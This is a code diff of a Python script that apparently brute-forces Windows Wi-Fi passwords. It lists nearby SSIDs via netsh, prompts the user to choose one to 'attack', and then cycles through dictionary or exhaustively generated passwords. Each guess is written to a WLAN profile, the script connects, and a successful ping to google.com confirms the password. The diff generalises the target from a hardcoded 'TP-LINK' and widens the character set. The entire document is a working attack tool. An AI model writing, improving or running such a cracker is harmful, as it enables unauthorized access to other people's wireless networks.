@@ -3,6 +3,7 @@ from time import sleep
 import subprocess
 import itertools
 from colorama import Fore
+import re
 xml_content = """<?xml version="1.0"?>
 <WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
     <name>%s</name>
@@ -34,14 +35,20 @@ xml_content = """<?xml version="1.0"?>
 def write_config(name,ssid,password):
     with open('connect.xml','w+') as f:
         f.write(xml_content % (name,ssid,password))
-def check_wifi(name):
-    available_wifi = subprocess.getoutput('netsh wlan show networks')
-    if name not in available_wifi:
-            print('this wifi doesn\'t exist! ')
-            exit()
-def brute_force_with_dictionary():
-    name = input('the name of wifi: ')
-    check_wifi(name)
+def show_available_wifis():
+    av_wifi = subprocess.getoutput('netsh wlan show network')
+    ssid_pattern = re.compile(r"\d : (.+)")
+    ssid_matches = ssid_pattern.findall(av_wifi)
+    for i in range(len(ssid_matches)):
+        print(f"{i+ 1}- {ssid_matches[i]}")
+    choose = int(input(Fore.RED + 'choose index of wifi do you want attack! -> '))
+    try:
+        if ssid_matches[choose - 1]:
+            choice(ssid_matches[choose - 1])
+    except IndexError:
+        print(Fore.RED + 'invalid choice!')
+        exit(0)
+def brute_force_with_dictionary(name):
     ssid = name
     file_password = input('the name of pass_list: ')
     if os.path.isfile(file_password) == False:
@@ -53,48 +60,46 @@ def brute_force_with_dictionary():
         password = i.strip()
         os.system('color a')
         write_config(name,ssid,password)
-        os.system('netsh wlan add profile filename="connect.xml"')
-        os.system('netsh wlan connect name="TP-LINK"')
+        subprocess.getoutput('netsh wlan add profile filename="connect.xml"')
+        subprocess.getoutput(f'netsh wlan connect name="{name}"')
+        print('wait for response! ')
         sleep(4)
-        x = os.system('ping -n 1 google.com')
+        x = subprocess.getoutput('ping -n 1 google.com')
         sleep(2)
-        if x == 0:
+        if 'Reply from' in x:
             os.system('cls')
             print(Fore.RED +  f'the password is {password}')
-            os.system('color 7')
             exit(0)
 
 def brute_force_all_things(password,name,ssid):
     os.system('color a')
     write_config(name,ssid,password)
-    os.system('netsh wlan add profile filename="connect.xml"')
-    os.system('netsh wlan connect name="TP-LINK"')
+    subprocess.getoutput('netsh wlan add profile filename="connect.xml"')
+    subprocess.getoutput(f'netsh wlan connect name="{name}"')
+    print('wait for response! ')
     sleep(4)
-    x = os.system('ping -n 1 google.com')
-    sleep(3)
-    if x == 0:
+    x = subprocess.getoutput('ping -n 1 google.com')
+    sleep(2)
+    if 'Reply from' in x:
         os.system('cls')
-        print(f'the password is {password}')
-        os.system('color 7')
+        print(Fore.RED +  f'the password is {password}')
         exit(0)
-def generate_brute_force_list():
-    characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
-    name = input('name of wifi: ')
-    check_wifi(name)
+def generate_brute_force_list(name):
+    characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ~!@#$%^&*()_+=-`[]\\\'";/.,|'
     ssid = name
     length = int(input('length for passwords: '))
     for combination in itertools.product(characters, repeat=length):
         password = ''.join(combination)
         print(password)
         brute_force_all_things(password,name,ssid)
-def choice():
+def choice(name):
     print(Fore.YELLOW + '1- dictionary attack\n2- brute force attack')
     choice = input('select -> ')
     if choice == '1':
-        brute_force_with_dictionary()
+        brute_force_with_dictionary(name)
     elif choice == '2':
-        generate_brute_force_list()
+        generate_brute_force_list(name)
     else:
         print('invalid choice!')
         exit()
-choice()
+show_available_wifis()
